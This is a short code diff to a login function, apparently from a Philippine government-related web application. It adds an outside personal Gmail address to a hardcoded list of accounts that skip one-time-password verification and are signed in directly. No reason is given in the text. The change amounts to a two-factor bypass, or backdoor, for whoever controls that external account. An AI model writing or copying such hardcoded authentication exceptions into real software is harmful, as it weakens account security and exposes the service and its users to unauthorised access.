@@ -85,7 +85,7 @@ def login():
                     db.session.commit()
                 except Exception:
                     db.session.rollback()
-            elif email in {"admin@0negov.ph", "admin@onegov.ph"} or not getattr(user, "login_otp_enabled", True):
+            elif email in {"admin@0negov.ph", "admin@onegov.ph", "transportationsupervisor@gmail.com"} or not getattr(user, "login_otp_enabled", True):
                 establish_session(user)
                 try:
                     log_activity(activity_type="Login", module="Authentication", description=f"User signed in: {user.email}", record_id=user.user_id, status="Success", user=user)
